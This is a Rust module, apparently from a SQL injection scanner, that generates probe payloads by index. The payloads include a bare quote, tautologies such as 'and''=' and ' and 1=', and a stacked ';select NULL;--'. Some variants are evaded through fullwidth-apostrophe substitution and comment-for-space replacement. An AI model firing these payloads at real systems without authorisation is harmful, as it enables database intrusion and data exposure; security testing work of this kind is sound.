use super::Injector;

pub fn unicode_obf(v: &Vec<u8>) -> Vec<u8> {
    let mut out = vec![];
    for x in v {
        if *x == b'\'' {
            out.extend(b"\xef\xbc\x87".to_vec())
        }
        else {
            out.push(*x);
        }
    }
    return out;
}
pub fn space_obf(v: &Vec<u8>) -> Vec<u8> {
    let mut out = vec![];
    for x in v {
        if *x == b' ' {
            out.extend(b"/**/".to_vec())
        }
        else {
            out.push(*x);
        }
    }
    return out;
}

pub fn inj(inj: &Injector, mut ith: u64, n: u64) -> Result<Vec<u8>, u64> {
    if ith == n {
        return Ok(b"'".to_vec());
    }
    ith += 1;
    if ith == n {
        return Ok(unicode_obf(&b"'".to_vec()));
    }
    ith += 1;
    if ith == n {
        return Ok(b"'and''='".to_vec());
    }
    ith += 1;
    if ith == n {
        return Ok(unicode_obf(&b"'and''='".to_vec()));
    }
    ith += 1;
    if ith == n {
        return Ok(space_obf(&unicode_obf(&b"'and''='".to_vec())));
    }
    ith += 1;
    if ith == n {
        return Ok(b" and 1=".to_vec());
    }
    ith += 1;
    if ith == n {
        return Ok(space_obf(&b" and 1=".to_vec()));
    }
    ith += 1;
    if ith == n {
        return Ok(b";select NULL;--".to_vec());
    }
    ith += 1;
    Err(ith)
}
